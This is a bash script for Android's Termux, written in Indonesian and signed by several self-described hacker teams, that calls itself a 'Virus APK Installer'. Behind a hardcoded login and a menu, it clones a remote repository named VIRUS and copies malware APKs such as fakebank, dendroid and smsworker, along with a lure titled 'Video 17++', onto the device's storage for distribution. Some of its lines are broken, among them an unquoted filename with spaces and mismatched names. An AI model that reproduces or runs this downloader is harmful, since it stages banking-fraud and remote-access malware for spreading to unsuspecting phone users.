#system/xbin/bash
#Ngapa Lu Liat²
#Ga Pernah Buat Tools Ya Sampe Recode Punya Orang Hahaha Kasian!!!!

echo $red"Welcome To My Security"
read -p "username : " user
read -p "Password : " pass
if [ $user = "ExGeneralTz" ] || [ $pass = "LnXploit" ]
then
clear
echo "Login Success!"
sleep 1
clear
else
echo "Password Salah!!!"
exit
fi

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'

trap ctrl_c INT
ctrl_c() {
clear
echo $red "Terimakasih Sudah Menggunakan Tools Ini"
sleep 1
echo $white "Dan Sampai Jumpa Dilain Waktu"
sleep 1
echo $red "Byee - Byee "
sleep 1
exit
}

echo $red"Loading."
sleep 0.5
clear
echo $yellow"Loading.."
sleep 0.5
clear
echo $green"Loading..."
sleep 0.5
clear
echo $red"Loading."
sleep 0.5
clear
echo $yellow"Loading.."
sleep 0.5
clear
echo $green"Loading..."
sleep 0.5
clear
echo $red"Loading."
sleep 0.5
clear
echo $yellow"Loading.."
sleep 0.5
clear
echo $green"Loading..."
sleep 0.5
clear

echo $white"—————————————————————————————————————————————————————————————————"
echo $red"                 WELCOME TO VIRUS APK INSTALLER                    "
echo $white"—————————————————————————————————————————————————————————————————"
echo $white"Author : EzGeneralTz"
echo $white"Virus  : Zakaria"
echo $white"Team   : Explicit Cyber Team - Insomnia Cyber Team"
echo $white"       : UnderGround Cyber Army - Army Cyber Network"
echo $white"       : Milworm Cyber Team - BL4CKH4MM3R"
echo $white"Tipe   : Virus Installer"
echo $white"FB     : Satria Andhika Adi Saputro"
echo $white"IG     : @andhika907"
echo $white"——————————————————————————————————————————————————————————————————"
echo $red"                 We Can Find You But You Can't Find Us.             "
echo $white"——————————————————————————————————————————————————————————————————"
date
echo ""
echo $white"Dipilih Mamank Virus Apknya"
echo $white"1->Video 17++.apk"
echo $white"2->fakebank.apk"
echo $white"3->dendroid.apk"
echo $white"4->laugther.apk"
echo $white"5->smsworker.apk"
echo $white"0->Pulang"
read -p "[ExGeneralTz>" ex ;

if [ $ex = 1 ]
then
clear
echo $red"SEDANG MENDOWNLOAD Video 17++.apk"
sleep 1
apt update
apt upgrade
pkg install git
git clone https://github.com/insomniacyberteam/VIRUS
cd VIRUS
mv -f Video Full++.apk /sdcard
echo $white"VIRUS OTOMATIS LANGSUNG ADA DI SDCARD"
fi

if [ $ex = 2 ]
then
clear
echo $red"SEDANG MENDOWNLOAD Fakebank.apk"
sleep 1
apt update
apt upgrade
pkg install git
git clone https://github.com/insomniacyberteam/VIRUS
cd VIRUS
mv -f fakebank.apk /sdcard
echo $white"VIRUS OTOMATIS LANGSUNG ADA DI SDCARD"
fi

if [ $ex = 3 ]
then
clear
echo $red"SEDANG MENDOWNLOAD Dendroid.apk"
sleep 1
apt update
apt upgrade
pkg install git
git clone https://github.com/insomniacyberteam/VIRUS
cd VIRUS
mv -f dendroid.apk /sdcard
echo $white"VIRUS OTOMATIS LANGSUNG ADA DI SDCARD"
fi

if [ $ex = 4 ]
then
clear
echo $red"SEDANG MENDOWNLOAD Laugther.apk"
sleep 1
apt update
apt upgrade
pkg install git
git clone https://github.com/insomniacyberteam/VIRUS
cd VIRUS
mv -f laugther.apk /sdcard
echo $white"VIRUS OTOMATIS LANGSUNG ADA DI SDCARD"
fi

if [ $ex = 5 ]
then
clear
echo $red"SEDANG MENDOWNLOAD SmsWorker.apk"
sleep 1
apt update
apt upgrade
pkg install git
git clone https://github.com/insomniacyberteam/VIRUS
cd VIRUS
mv -f smsworker.apk /sdcard
echo $white"VIRUS OTOMATIS LANGSUNG ADA DI SDCARD"
fi

if [ $ex = 0 ]
then
clear
echo $white"Cie Cie Yang Ga Punya Paketan"
sleep 2
echo $white"Apa Harus Gua Juga Yang Beliin :v"
sleep 2
echo $white"Yaudah Sana Beli Paketan Dulu :v"
sleep 2
echo $white"Entar Balik Lagi Yah Kalo Udh Punya Paketan :v"
sleep 2
exit
fi
